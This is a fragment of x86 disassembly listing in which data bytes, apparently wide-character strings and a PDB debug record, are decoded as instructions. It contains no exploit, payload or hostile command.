  42aaac:	add    BYTE PTR [eax],al
  42aaae:	dec    ecx
  42aaaf:	add    BYTE PTR [ebp+0x0],dl
  42aab2:	dec    edi
  42aab3:	add    BYTE PTR [eax],bh
  42aab5:	add    BYTE PTR [edi+0x0],bl
  42aab8:	inc    esp
  42aab9:	add    BYTE PTR [eax],bh
  42aabb:	add    BYTE PTR [ecx+0x0],cl
  42aabe:	dec    eax
  42aabf:	add    BYTE PTR [edi+0x0],cl
  42aac2:	pop    edi
  42aac3:	add    BYTE PTR [ebp+0x0],al
  42aac6:	pop    eax
  42aac7:	add    BYTE PTR [eax],al
  42aac9:	add    BYTE PTR [edx+0x0],dl
  42aacc:	dec    esp
  42aacd:	add    BYTE PTR [esi],dh
  42aacf:	add    BYTE PTR [edi+0x0],bl
  42aad2:	aaa    
  42aad3:	add    BYTE PTR [eax+0x0],bl
  42aad6:	xor    eax,DWORD PTR [eax]
  42aad8:	inc    edi
  42aad9:	add    BYTE PTR [ecx+0x0],dl
  42aadc:	pop    edi
  42aadd:	add    BYTE PTR [edx+0x0],cl
  42aae0:	add    BYTE PTR [eax],al
  42aae2:	inc    edi
  42aae3:	add    BYTE PTR [edi+0x0],cl
  42aae6:	push   ebx
  42aae7:	add    BYTE PTR [eax+eax*1],dh
  42aaea:	pop    edi
  42aaeb:	add    BYTE PTR [ecx+0x0],cl
  42aaee:	xor    DWORD PTR [eax],eax
  42aaf0:	push   esi
  42aaf1:	add    BYTE PTR [ebx],dh
  42aaf3:	add    BYTE PTR [edi+0x0],bl
  42aaf6:	dec    ecx
  42aaf7:	add    BYTE PTR [edx+0x0],bl
  42aafa:	add    BYTE PTR [eax],al
  42aafc:	inc    ebx
  42aafd:	add    BYTE PTR [ecx+0x0],bl
  42ab00:	inc    ecx
  42ab01:	add    BYTE PTR [eax],dh
  42ab03:	add    BYTE PTR [ecx],bh
  42ab05:	add    BYTE PTR [edi+0x0],bl
  42ab08:	cmp    DWORD PTR [eax],eax
  42ab0a:	push   eax
  42ab0b:	add    BYTE PTR [eax+eax*1],dh
  42ab0e:	pop    edx
  42ab0f:	add    BYTE PTR [eax],al
  42ab11:	add    BYTE PTR [edx+0x0],al
  42ab14:	inc    esi
  42ab15:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42ab19:	add    BYTE PTR [ebp+0x0],dl
  42ab1c:	push   ebp
  42ab1d:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab21:	add    BYTE PTR [eax],al
  42ab23:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab27:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab2b:	add    BYTE PTR [edi+0x0],bl
  42ab2e:	xor    eax,DWORD PTR [eax]
  42ab30:	cmp    DWORD PTR [eax],eax
  42ab32:	dec    eax
  42ab33:	add    BYTE PTR [edi+0x0],bl
  42ab36:	dec    ebp
  42ab37:	add    BYTE PTR [ecx+0x0],bl
  42ab3a:	cmp    DWORD PTR [eax],eax
  42ab3c:	inc    ecx
  42ab3d:	add    BYTE PTR [esi+0x0],cl
  42ab40:	add    BYTE PTR [eax],al
  42ab42:	inc    ebx
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	dec    esi
  42ab47:	add    BYTE PTR [eax+eax*1],dh
  42ab4a:	pop    edi
  42ab4b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab4f:	add    BYTE PTR [ebx+0x0],cl
  42ab52:	xor    DWORD PTR [eax],eax
  42ab54:	add    BYTE PTR [eax],al
  42ab56:	inc    ecx
  42ab57:	add    BYTE PTR [edi],dh
  42ab59:	add    BYTE PTR [edx+0x0],cl
  42ab5c:	pop    edi
  42ab5d:	add    BYTE PTR [ebx+0x0],al
  42ab60:	cmp    BYTE PTR [eax],al
  42ab62:	push   edi
  42ab63:	add    BYTE PTR [eax+0x0],dl
  42ab66:	pop    edi
  42ab67:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab6b:	add    BYTE PTR [edx],dh
  42ab6d:	add    BYTE PTR [eax],al
  42ab6f:	add    BYTE PTR [edx+0x0],al
  42ab72:	add    BYTE PTR [eax],al
  42ab74:	push   edx
  42ab75:	push   ebx
  42ab76:	inc    esp
  42ab77:	push   ebx
  42ab78:	add    esp,DWORD PTR [eax-0x68995613]
  42ab7e:	fs inc eax
  42ab80:	xchg   ebx,eax
  42ab81:	adc    BYTE PTR ds:0x4df5508d,dh
  42ab87:	mov    eax,ds:0x1c
  42ab8c:	push   ecx
  42ab8d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab91:	js     0x42abe8
  42ab93:	jbe    0x42ac07
  42ab95:	arpl   WORD PTR [esi+0x75],dx
  42ab98:	popa   
  42ab99:	push   esi
  42ab9a:	pop    esp
  42ab9b:	outs   dx,DWORD PTR ds:[esi]
  42ab9c:	ins    DWORD PTR es:[edi],dx
  42ab9d:	dec    eax
  42ab9e:	inc    edi
  42ab9f:	push   0x6c445178
  42aba4:	jbe    0x42ac17
  42aba6:	pop    esp
  42aba7:	push   0x70
  42aba9:	js     0x42ac0c
  42abab:	ins    BYTE PTR es:[edi],dx
  42abac:	ins    BYTE PTR es:[edi],dx
  42abad:	dec    eax
  42abae:	addr16 pop esp
  42abb0:	push   0x4a
  42abb2:	jb     0x42ac16
  42abb4:	push   esp
  42abb5:	ins    DWORD PTR es:[edi],dx
  42abb6:	push   edx
  42abb7:	bound  eax,QWORD PTR [edi+0x6d]
  42abba:	push   eax
  42abbb:	arpl   WORD PTR [esi+0x77],ax
  42abbe:	pop    esp
  42abbf:	jo     0x42ac2b
  42abc1:	dec    ecx
  42abc2:	inc    ebp
  42abc3:	push   bp
  42abc5:	ins    BYTE PTR es:[edi],dx
  42abc6:	inc    ebp
  42abc7:	dec    ebp
  42abc8:	jne    0x42ac41
  42abca:	jbe    0x42ac15
  42abcc:	cs jo  0x42ac33
  42abcf:	bound  eax,QWORD PTR [eax]
	...
